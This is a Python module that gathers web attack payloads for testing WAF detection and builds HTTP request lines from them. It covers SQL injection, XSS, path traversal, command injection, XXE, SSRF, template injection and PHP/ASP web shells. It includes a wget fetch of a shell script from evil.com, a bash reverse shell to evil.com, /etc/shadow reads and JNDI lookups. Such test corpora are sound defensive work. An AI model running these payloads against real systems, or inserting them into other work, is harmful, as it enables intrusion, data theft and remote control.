"""
Malicious Payloads Collection

Collection of malicious payloads for testing WAF detection
Based on OWASP Top 10 and common attack patterns
"""
from typing import List, Dict


# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    "1' OR '1'='1",
    "1' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' OR SLEEP(5)--",
    "1'; DROP TABLE users--",
    "1' UNION SELECT user, password FROM users--",
    "1' OR '1'='1' /*",
    "1' OR '1'='1' #",
    "1' OR '1'='1' --",
    "1' OR '1'='1' UNION SELECT NULL, NULL--",
    "1' OR '1'='1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "' UNION SELECT NULL, NULL, NULL--",
    "admin' OR '1'='1",
    "' OR 'x'='x",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1' OR '1'='1' LIMIT 1--",
    "1' OR '1'='1' ORDER BY 1--",
    "1' OR '1'='1' GROUP BY 1--",
    "1' OR '1'='1' HAVING 1=1--",
]

# XSS (Cross-Site Scripting) Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>",
    "<a href=javascript:alert('XSS')>click</a>",
    "<form><button formaction=javascript:alert('XSS')>click</button>",
    "javascript:alert('XSS')",
    "onerror=alert('XSS')",
    "<script>eval('alert(\"XSS\")')</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%2Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\sam",
    "../../../etc/shadow",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/shadow",
    "/etc/shadow",
    "../../../proc/self/environ",
    "..%2F..%2F..%2Fproc%2Fself%2Fenviron",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "&& ls -la",
    "|| ls -la",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "; whoami",
    "| whoami",
    "& whoami",
    "; id",
    "| id",
    "& id",
    "; uname -a",
    "| uname -a",
    "& uname -a",
    "; ping -c 4 127.0.0.1",
    "| ping -c 4 127.0.0.1",
    "& ping -c 4 127.0.0.1",
    "; wget http://evil.com/shell.sh",
    "| wget http://evil.com/shell.sh",
    "& wget http://evil.com/shell.sh",
]

# XXE (XML External Entity) Payloads
XXE_PAYLOADS = [
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
]

# SSRF (Server-Side Request Forgery) Payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://localhost:22",
    "http://localhost:3306",
    "http://localhost:6379",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a",
    "dict://127.0.0.1:6379/",
]

# File Upload Attack Payloads
FILE_UPLOAD_PAYLOADS = [
    "<?php system($_GET['cmd']); ?>",
    "<?php eval($_POST['cmd']); ?>",
    "<?php phpinfo(); ?>",
    "<%eval request(\"cmd\")%>",
    "<script language=\"JScript\">eval(Request.Item[\"cmd\"])</script>",
    "#!/bin/bash\n/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1",
    "GIF89a<?php system($_GET['cmd']); ?>",
    "<?php\n$file = $_GET['file'];\ninclude($file);\n?>",
]

# LDAP Injection Payloads
LDAP_INJECTION_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "*))%00",
    "*()|&",
    "*()|&(",
    "admin)(&",
    "admin)(|",
    "admin)(!",
    "admin)(&(objectClass=*))",
]

# NoSQL Injection Payloads
NOSQL_INJECTION_PAYLOADS = [
    "'; return true; var x='",
    "' || '1'=='1",
    "' || 1==1 || '",
    "'; return true; //",
    "' || 1==1//",
    "'; return true; var x='",
    "'; return true; var x='",
    "'; return true; var x='",
]

# Template Injection Payloads
TEMPLATE_INJECTION_PAYLOADS = [
    "${7*7}",
    "${__import__('os').system('id')}",
    "#{7*7}",
    "#{__import__('os').system('id')}",
    "{{7*7}}",
    "{{__import__('os').system('id')}}",
    "${jndi:ldap://evil.com/a}",
    "#{jndi:ldap://evil.com/a}",
]


def get_all_malicious_payloads() -> Dict[str, List[str]]:
    """Get all malicious payloads organized by category"""
    return {
        'sql_injection': SQL_INJECTION_PAYLOADS,
        'xss': XSS_PAYLOADS,
        'path_traversal': PATH_TRAVERSAL_PAYLOADS,
        'command_injection': COMMAND_INJECTION_PAYLOADS,
        'xxe': XXE_PAYLOADS,
        'ssrf': SSRF_PAYLOADS,
        'file_upload': FILE_UPLOAD_PAYLOADS,
        'ldap_injection': LDAP_INJECTION_PAYLOADS,
        'nosql_injection': NOSQL_INJECTION_PAYLOADS,
        'template_injection': TEMPLATE_INJECTION_PAYLOADS,
    }


def generate_malicious_requests(
    base_path: str = "/api/data",
    method: str = "GET"
) -> List[str]:
    """
    Generate malicious HTTP requests from payloads
    
    Args:
        base_path: Base path for requests
        method: HTTP method
    
    Returns:
        List of malicious request strings
    """
    requests = []
    all_payloads = get_all_malicious_payloads()
    
    for category, payloads in all_payloads.items():
        for payload in payloads:
            # Create request with payload in query parameter
            request = f"{method} {base_path}?id={payload} HTTP/1.1"
            requests.append(request)
            
            # Also create with payload in path
            if len(payload) < 50:  # Only for short payloads
                request = f"{method} {base_path}/{payload} HTTP/1.1"
                requests.append(request)
    
    return requests


def get_payload_count() -> int:
    """Get total number of malicious payloads"""
    all_payloads = get_all_malicious_payloads()
    return sum(len(payloads) for payloads in all_payloads.values())
